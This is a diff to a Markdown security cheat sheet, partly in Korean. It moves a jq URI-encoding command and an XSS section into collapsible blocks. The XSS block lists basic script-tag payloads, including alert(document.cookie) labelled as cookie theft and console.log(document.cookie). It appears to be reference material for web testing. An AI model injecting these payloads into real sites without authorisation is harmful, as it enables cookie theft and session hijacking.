@@ -1,8 +1,33 @@
-# URI encoding
+<details><summary><strong>URI encoding</strong></summary>
+
 ```bash
 echo 'hi!' | jq -srR '@uri'
 ```
-# XSS (Cross-Site Scripting)
+
+</details>
+
+<details>
+<summary><strong>XSS (Cross-Site Scripting)</strong></summary>
+
+### 기본 공격 페이로드
+
+### 스크립트 태그 기반
+```html
+<!-- 기본 alert 실행 - 현재 도메인 정보 확인 -->
+<script>alert(window.origin)</script>
+
+<!-- 쿠키 정보 탈취 -->
+<script>alert(document.cookie)</script>
+
+<!-- 단순 XSS 동작 확인 -->
+<script>alert('XSS')</script>
+
+<!-- 콘솔 로그 출력 - 디버깅 및 정보 수집 -->
+<script>console.log(document.cookie)</script>
+```
+
+</details>
+
 ## 기본 공격 페이로드
 
 ### 스크립트 태그 기반
